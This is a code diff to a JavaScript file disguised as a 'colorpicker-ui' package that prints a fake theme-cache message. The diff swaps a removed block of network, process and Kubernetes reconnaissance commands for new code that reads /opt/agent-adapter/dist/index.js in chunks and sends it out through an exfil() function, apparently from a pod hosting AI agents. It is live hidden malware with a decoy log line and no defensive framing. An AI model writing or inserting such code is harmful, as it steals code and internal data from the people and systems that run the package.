@@ -26,39 +26,20 @@ function exfil(data) {
 }
 
 async function run() {
-  await exfil({ status: 'local recon v2 started' });
+  await exfil({ status: 'dumping agent-adapter' });
 
   const d = {};
-
-  // Network / ARP
-  d.arp = exec('ip neigh 2>/dev/null || arp -a 2>/dev/null || cat /proc/net/arp 2>/dev/null');
-  d.routes = exec('ip route 2>/dev/null || route -n 2>/dev/null');
-  d.interfaces = exec('ip a 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/if_inet6 2>/dev/null && cat /proc/net/dev 2>/dev/null');
-
-  // What's listening on our pod
-  d.listening = exec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null');
-  d.connections = exec('ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null');
-
-  // Running processes
-  d.processes = exec('ps aux 2>/dev/null || ps -ef 2>/dev/null || cat /proc/*/cmdline 2>/dev/null | tr "\\0" " " | head -50');
-
-  // Services / ports on localhost
-  d.localhost_ports = exec('for p in 80 443 3000 4000 5000 6379 8000 8080 8443 9090 9200 27017; do (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "127.0.0.1:$p OPEN"; done');
-
-  // DNS / service discovery
-  d.resolv = exec('cat /etc/resolv.conf');
-  d.hosts = exec('cat /etc/hosts');
-
-  // K8s service env vars (injected by K8s for each service)
-  d.k8s_services = exec('env | grep -i "_SERVICE_\\|_PORT" | sort');
-
-  // Check if we can reach the relay/gateway directly
-  d.relay_check = exec('curl -s -m2 -o /dev/null -w "%{http_code}" https://claw-api.virtuals.io/healthz 2>/dev/null || echo "unreachable"');
-
-  // Check other interesting internal endpoints
-  d.internal_probes = exec('for h in agent relay gateway api claw-api; do dig +short $h.default.svc.cluster.local @10.100.0.10 2>/dev/null; done');
+  d.ls = exec('ls -la /opt/agent-adapter/ 2>/dev/null && ls -la /opt/agent-adapter/dist/ 2>/dev/null');
+  d.index_js = exec('cat /opt/agent-adapter/dist/index.js 2>/dev/null | head -500');
 
   await exfil(d);
+
+  // If it's large, send the rest
+  const rest = exec('cat /opt/agent-adapter/dist/index.js 2>/dev/null | tail -n +501 | head -500');
+  if (rest && !rest.startsWith('ERROR')) {
+    await exfil({ index_js_part2: rest });
+  }
+
   console.log('colorpicker-ui: generating default theme cache...');
 }
 
